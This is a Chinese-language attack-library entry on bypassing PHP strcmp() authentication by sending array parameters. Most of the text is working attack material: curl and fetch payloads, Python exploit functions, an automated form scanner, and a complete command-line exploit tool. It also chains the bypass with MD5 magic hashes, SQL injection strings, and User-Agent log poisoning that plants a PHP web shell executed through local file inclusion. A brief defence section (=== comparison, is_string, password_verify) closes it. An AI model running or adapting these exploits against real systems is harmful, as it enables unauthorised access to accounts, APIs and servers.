# PHP-strcmp绕过-攻击库

## 概述

**攻击类型**：认证绕过 - strcmp数组绕过  
**影响语言**：PHP  
**风险等级**：High  
**攻击目标**：利用PHP strcmp()函数对数组参数返回NULL的特性绕过身份验证

**核心原理**：
当PHP的`strcmp()`函数接收到数组作为参数时，会发出警告并返回`NULL`。在PHP的弱类型比较中，`NULL == 0`为真，导致原本设计为密码比较的逻辑被绕过。

**典型漏洞代码**：
```php
if (strcmp($_POST['password'], $real_password) == 0) {
    // 登录成功
}
```

当传入`password[]=`时，strcmp返回NULL，条件判断`NULL == 0`为真，绕过认证。

---

## 核心攻击技术

### 技术1：基本strcmp数组绕过

**原理**：
`strcmp()`期望接收两个字符串参数。当第一个参数是数组时，函数返回NULL而非0或其他整数。

**漏洞代码示例**：
```php
<?php
$username = $_GET['username'];
$password = $_GET['password'];

$real_username = "admin";
$real_password = "secret123";

// ⚠️ 漏洞：使用strcmp比较，且使用==弱类型比较
if ($username == $real_username && strcmp($password, $real_password) == 0) {
    echo "Login successful! Flag: " . $flag;
} else {
    echo "Login failed!";
}
?>
```

**攻击Payload**：
```bash
# GET请求
http://target/?username=admin&password[]=

# POST请求
username=admin&password[]=

# curl命令
curl "http://target/?username=admin&password[]="
```

**工作原理**：
```php
// 正常情况
strcmp("input", "secret123")  // 返回非0整数

// 数组绕过
strcmp([""], "secret123")     // 返回 NULL

// PHP弱类型比较
NULL == 0                     // true
0 == 0                       // true
```

**利用代码**：
```python
import requests

def exploit_strcmp_bypass(target_url):
    """strcmp数组绕过利用"""
    
    # 方法1：GET请求
    params = {
        'username': 'admin',
        'password[]': ''  # 数组参数
    }
    
    r = requests.get(target_url, params=params)
    
    if 'flag{' in r.text.lower() or 'success' in r.text.lower():
        print("[+] strcmp绕过成功 (GET)")
        return r.text
    
    # 方法2：POST请求
    data = {
        'username': 'admin',
        'password[]': ''
    }
    
    r = requests.post(target_url, data=data)
    
    if 'flag{' in r.text.lower() or 'success' in r.text.lower():
        print("[+] strcmp绕过成功 (POST)")
        return r.text
    
    return None
```

---

### 技术2：识别strcmp漏洞特征

**原理**：
通过分析错误消息、源代码或行为差异来识别strcmp使用场景。

**识别技术1 - 错误消息泄露**：
```php
// 如果error_reporting开启
strcmp($_POST['password'], $real_password)

// 传入数组时的错误
Warning: strcmp() expects parameter 1 to be string, array given
```

**识别技术2 - 响应时间差异**：
```python
import time

def detect_strcmp(url):
    """检测是否使用strcmp"""
    
    # 正常请求
    start = time.time()
    r1 = requests.post(url, data={'password': 'test'})
    time1 = time.time() - start
    
    # 数组请求
    start = time.time()
    r2 = requests.post(url, data={'password[]': ''})
    time2 = time.time() - start
    
    # 检查响应差异
    if r1.text != r2.text:
        print("[+] 检测到不同响应，可能存在strcmp")
        return True
    
    return False
```

**识别技术3 - 源代码审计**：
```bash
# 查找strcmp使用
grep -r "strcmp" *.php

# 查找弱类型比较
grep -r "== 0" *.php | grep strcmp
```

---

### 技术3：多参数strcmp绕过

**原理**：
当多个参数都使用strcmp验证时，需要同时绕过所有验证。

**漏洞代码示例**：
```php
<?php
if (strcmp($_POST['user'], $real_user) == 0 && 
    strcmp($_POST['pass'], $real_pass) == 0 &&
    strcmp($_POST['token'], $real_token) == 0) {
    // 验证成功
}
?>
```

**攻击Payload**：
```bash
# 所有参数都使用数组
user[]=&pass[]=&token[]=

# curl示例
curl -X POST http://target/ \
  -d "user[]=&pass[]=&token[]="
```

**利用代码**：
```python
def exploit_multiple_strcmp(target_url, params_list):
    """多参数strcmp绕过"""
    
    # 构造所有参数为数组
    data = {}
    for param in params_list:
        data[f'{param}[]'] = ''
    
    r = requests.post(target_url, data=data)
    
    if 'success' in r.text.lower():
        print(f"[+] 成功绕过 {len(params_list)} 个strcmp验证")
        return True
    
    return False

# 使用示例
exploit_multiple_strcmp('http://target/login.php', 
                       ['username', 'password', 'token'])
```

---

### 技术4：结合其他PHP类型混淆

**原理**：
strcmp绕过可以与其他PHP类型混淆漏洞组合使用，提高成功率。

**组合技术1 - strcmp + in_array绕过**：
```php
<?php
// 验证用户角色
if (strcmp($_POST['password'], $pass) == 0 && in_array($_POST['role'], ['user', 'admin'])) {
    // role可以是数组 ['admin']
}
?>
```

**Payload**：
```bash
password[]=&role[]=admin
```

**组合技术2 - strcmp + is_numeric绕过**：
```php
<?php
if (is_numeric($_POST['id']) && strcmp($_POST['password'], $pass) == 0) {
    // id传入数字字符串，password传入数组
}
?>
```

**Payload**：
```bash
id=1&password[]=
```

**组合技术3 - strcmp + MD5比较**：
```php
<?php
// MD5碰撞 + strcmp绕过
if (md5($_POST['a']) == md5($_POST['b']) && 
    strcmp($_POST['password'], $pass) == 0) {
    // a和b使用MD5魔术哈希，password使用数组
}
?>
```

**完整利用代码**：
```python
def exploit_combined_bypass(target_url):
    """组合绕过技术"""
    
    # MD5魔术哈希
    md5_collision = [
        '240610708',  # md5 = 0e462097431906509019562988736854
        'QNKCDZO',    # md5 = 0e830400451993494058024219903391
    ]
    
    data = {
        'a': md5_collision[0],
        'b': md5_collision[1],
        'password[]': '',
        'role[]': 'admin'
    }
    
    r = requests.post(target_url, data=data)
    
    if 'flag{' in r.text.lower():
        print("[+] 组合绕过成功!")
        return r.text
    
    return None
```

---

### 技术5：绕过强类型比较

**原理**：
如果代码使用`===`强类型比较，数组绕过会失效，需要寻找其他漏洞点。

**强类型代码（无法绕过）**：
```php
<?php
// 使用 === 强类型比较
if (strcmp($_POST['password'], $real_password) === 0) {
    // 无法用数组绕过，NULL !== 0
}
?>
```

**替代攻击方法**：
```python
def attack_strict_comparison(target_url):
    """针对强类型比较的替代方法"""
    
    # 1. 尝试SQL注入
    sqli_payloads = [
        "' OR '1'='1",
        "admin'--",
        "' UNION SELECT NULL--"
    ]
    
    # 2. 尝试暴力破解
    wordlist = ['admin', 'password', '123456', 'admin123']
    
    # 3. 尝试其他认证绕过
    for payload in sqli_payloads:
        r = requests.post(target_url, data={
            'username': 'admin',
            'password': payload
        })
        
        if 'success' in r.text.lower():
            print(f"[+] SQL注入成功: {payload}")
            return r.text
    
    return None
```

---

### 技术6：自动化strcmp漏洞扫描

**原理**：
自动检测和利用strcmp漏洞。

**扫描器代码**：
```python
class StrcmpScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def scan_forms(self):
        """扫描页面中的表单"""
        r = self.session.get(self.target_url)
        
        # 解析HTML查找表单
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(r.text, 'html.parser')
        
        forms = soup.find_all('form')
        
        for form in forms:
            print(f"[*] 发现表单: {form.get('action', 'N/A')}")
            
            # 获取所有输入字段
            inputs = form.find_all('input')
            
            for inp in inputs:
                field_name = inp.get('name')
                field_type = inp.get('type')
                
                if field_type in ['password', 'text']:
                    print(f"    字段: {field_name} ({field_type})")
                    
                    # 测试strcmp绕过
                    self.test_strcmp_bypass(field_name)
    
    def test_strcmp_bypass(self, field_name):
        """测试单个字段的strcmp绕过"""
        
        # 构造数组参数
        data = {f'{field_name}[]': ''}
        
        r = self.session.post(self.target_url, data=data)
        
        # 检查是否成功
        success_indicators = [
            'welcome',
            'success',
            'logged in',
            'flag{',
            'congratulations'
        ]
        
        for indicator in success_indicators:
            if indicator in r.text.lower():
                print(f"[+] strcmp绕过成功: {field_name}")
                return True
        
        return False
    
    def full_scan(self):
        """完整扫描流程"""
        print(f"[*] 扫描目标: {self.target_url}")
        
        # 1. 扫描表单
        self.scan_forms()
        
        # 2. 测试常见参数
        common_params = [
            'password',
            'pass',
            'pwd',
            'passwd',
            'user_password',
            'login_password'
        ]
        
        for param in common_params:
            print(f"[*] 测试参数: {param}")
            self.test_strcmp_bypass(param)

# 使用示例
scanner = StrcmpScanner('http://target/login.php')
scanner.full_scan()
```

---

### 技术7：strcmp日志投毒

**原理**：
结合LFI漏洞，通过strcmp绕过上传恶意内容到日志。

**攻击流程**：
```
1. 利用strcmp绕过登录 → 2. 访问日志写入功能 → 3. 注入恶意代码到日志 → 4. LFI包含日志执行代码
```

**利用代码**：
```python
def exploit_strcmp_log_poison(target_url, lfi_url):
    """strcmp绕过 + 日志投毒"""
    
    # 1. strcmp绕过登录
    login_data = {
        'username': 'admin',
        'password[]': ''
    }
    
    session = requests.Session()
    r = session.post(f"{target_url}/login.php", data=login_data)
    
    if 'success' not in r.text.lower():
        print("[-] strcmp绕过失败")
        return None
    
    print("[+] strcmp绕过成功，已登录")
    
    # 2. 访问页面注入PHP代码到User-Agent（写入access.log）
    malicious_ua = "<?php system($_GET['cmd']); ?>"
    
    session.headers.update({'User-Agent': malicious_ua})
    session.get(f"{target_url}/admin/log.php")
    
    print("[+] 恶意代码已注入到日志")
    
    # 3. LFI包含日志执行命令
    r = session.get(lfi_url, params={
        'file': '../../../../../var/log/apache2/access.log',
        'cmd': 'cat /flag'
    })
    
    if 'flag{' in r.text.lower():
        print("[+] 成功获取FLAG!")
        return r.text
    
    return None
```

---

## 完整自动化利用工具

```python
#!/usr/bin/env python3
"""
PHP strcmp绕过完整利用工具
"""
import requests
import sys
import re
from bs4 import BeautifulSoup

class StrcmpExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.found_vulns = []
    
    def test_basic_bypass(self, username='admin'):
        """测试基本strcmp绕过"""
        print("[*] 测试基本strcmp绕过...")
        
        # GET请求
        params = {
            'username': username,
            'password[]': ''
        }
        
        r = self.session.get(self.target_url, params=params)
        
        if self.check_success(r.text):
            print("[+] GET请求绕过成功!")
            return r.text
        
        # POST请求
        data = {
            'username': username,
            'password[]': ''
        }
        
        r = self.session.post(self.target_url, data=data)
        
        if self.check_success(r.text):
            print("[+] POST请求绕过成功!")
            return r.text
        
        return None
    
    def check_success(self, response_text):
        """检查是否成功绕过"""
        success_indicators = [
            'welcome',
            'success',
            'logged in',
            'flag{',
            'congratulations',
            'admin panel',
            'dashboard'
        ]
        
        response_lower = response_text.lower()
        
        for indicator in success_indicators:
            if indicator in response_lower:
                return True
        
        return False
    
    def enumerate_usernames(self):
        """枚举用户名"""
        print("[*] 枚举常见用户名...")
        
        common_usernames = [
            'admin',
            'administrator',
            'root',
            'user',
            'test',
            'guest'
        ]
        
        for username in common_usernames:
            result = self.test_basic_bypass(username)
            if result:
                print(f"[+] 成功的用户名: {username}")
                return username
        
        return None
    
    def extract_flag(self, response_text):
        """从响应中提取FLAG"""
        flag_match = re.search(r'flag\{[^}]+\}', response_text, re.I)
        
        if flag_match:
            return flag_match.group()
        
        # 尝试其他格式
        patterns = [
            r'xbow\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'flag:\s*([a-f0-9]{32})',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_text, re.I)
            if match:
                return match.group()
        
        return None
    
    def test_multiple_params(self):
        """测试多参数绕过"""
        print("[*] 测试多参数strcmp绕过...")
        
        # 尝试不同的参数组合
        param_combinations = [
            {'user[]': '', 'pass[]': ''},
            {'username[]': '', 'password[]': '', 'token[]': ''},
            {'login[]': '', 'pwd[]': ''},
        ]
        
        for params in param_combinations:
            r = self.session.post(self.target_url, data=params)
            
            if self.check_success(r.text):
                print(f"[+] 多参数绕过成功: {list(params.keys())}")
                return r.text
        
        return None
    
    def full_exploit(self):
        """完整利用流程"""
        print("="*60)
        print("PHP strcmp绕过完整利用工具")
        print("="*60 + "\n")
        
        print(f"[*] 目标: {self.target_url}\n")
        
        # 1. 测试基本绕过
        result = self.test_basic_bypass()
        
        if result:
            flag = self.extract_flag(result)
            if flag:
                print(f"\n[+] FLAG: {flag}")
                return flag
            else:
                print("\n[+] 绕过成功但未找到FLAG")
                return result
        
        # 2. 枚举用户名
        username = self.enumerate_usernames()
        
        if username:
            result = self.test_basic_bypass(username)
            if result:
                flag = self.extract_flag(result)
                if flag:
                    print(f"\n[+] FLAG: {flag}")
                    return flag
        
        # 3. 测试多参数
        result = self.test_multiple_params()
        
        if result:
            flag = self.extract_flag(result)
            if flag:
                print(f"\n[+] FLAG: {flag}")
                return flag
        
        print("\n[-] 所有方法均未成功")
        return None

# 命令行使用
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL>")
        print(f"例如: {sys.argv[0]} http://target/login.php")
        sys.exit(1)
    
    target = sys.argv[1]
    
    exploit = StrcmpExploit(target)
    result = exploit.full_exploit()
    
    if result:
        print("\n[+] 攻击成功!")
    else:
        print("\n[-] 攻击失败")
```

---

## 实战场景

### 场景1：登录表单strcmp绕过

**应用背景**：
PHP 5应用，使用strcmp进行密码验证。

**漏洞代码**：
```php
<?php
if ($_GET['username'] == "admin" && strcmp($_GET['password'], $password) == 0) {
    echo "Flag: " . $flag;
}
?>
```

**利用步骤**：
```bash
# 直接访问
curl "http://target/?username=admin&password[]="

# 或在浏览器中
http://target/?username=admin&password[]=
```

---

### 场景2：API认证strcmp绕过

**应用背景**：
RESTful API使用strcmp验证API密钥。

**漏洞代码**：
```php
<?php
$api_key = $_POST['api_key'];

if (strcmp($api_key, $real_api_key) == 0) {
    echo json_encode(['status' => 'success', 'data' => $sensitive_data]);
}
?>
```

**利用代码**：
```python
import requests

r = requests.post('http://target/api/endpoint', data={
    'api_key[]': ''
})

print(r.json())
```

---

### 场景3：多因素认证绕过

**应用背景**：
多个验证点都使用strcmp。

**利用代码**：
```python
import requests

data = {
    'username': 'admin',
    'password[]': '',
    'token[]': '',
    'otp[]': ''
}

r = requests.post('http://target/login.php', data=data)

if 'success' in r.text:
    print("[+] 多因素认证全部绕过!")
```

---

## 手动测试命令

```bash
# 1. 基本GET请求绕过
curl "http://target/login.php?username=admin&password[]="

# 2. POST请求绕过
curl -X POST http://target/login.php \
  -d "username=admin&password[]="

# 3. 多参数绕过
curl -X POST http://target/api \
  -d "user[]=&pass[]=&token[]="

# 4. 使用浏览器开发者工具
# 在Console中执行：
fetch('/login.php', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'username=admin&password[]='
}).then(r => r.text()).then(console.log)
```

---

## Payload速查表

| 场景 | Payload | 说明 |
|------|---------|------|
| GET参数 | `?password[]=` | 基本数组绕过 |
| POST参数 | `password[]=` | POST数组绕过 |
| 多参数 | `user[]=&pass[]=` | 多个strcmp |
| JSON API | `{"password":[]}` | JSON数组 |
| 编码绕过 | `password%5B%5D=` | URL编码 |

---

## 防御措施

### 1. 使用强类型比较

```php
<?php
// 不要这样
if (strcmp($input, $real) == 0) {  // 弱类型，可绕过
    
}

// 应该这样
if (strcmp($input, $real) === 0) {  // 强类型，NULL !== 0
    
}
?>
```

### 2. 验证输入类型

```php
<?php
// 确保输入是字符串
if (!is_string($_POST['password'])) {
    die("Invalid input type");
}

if (strcmp($_POST['password'], $real_password) === 0) {
    // 安全的验证
}
?>
```

### 3. 使用password_verify

```php
<?php
// 不要用strcmp比较密码
// if (strcmp($input, $hashed_password) == 0) {

// 应该用password_verify
if (password_verify($input, $hashed_password)) {
    // 安全的密码验证
}
?>
```

### 4. 使用hash_equals

```php
<?php
// 用于比较哈希值时防止时序攻击
if (hash_equals($input_hash, $real_hash)) {
    // 安全的哈希比较
}
?>
```

---

## 总结

**PHP strcmp绕过攻击要点**：
1. ✅ strcmp()接收数组参数时返回NULL
2. ✅ PHP弱类型比较 `NULL == 0` 为真
3. ✅ 使用`password[]=`传递数组参数
4. ✅ 可与其他PHP类型混淆组合使用
5. ✅ 防御关键：强类型比较 `===` + 输入类型验证
6. ✅ 推荐使用`password_verify()`而非strcmp

strcmp绕过是PHP应用中常见的认证绕过漏洞，利用简单但影响严重。
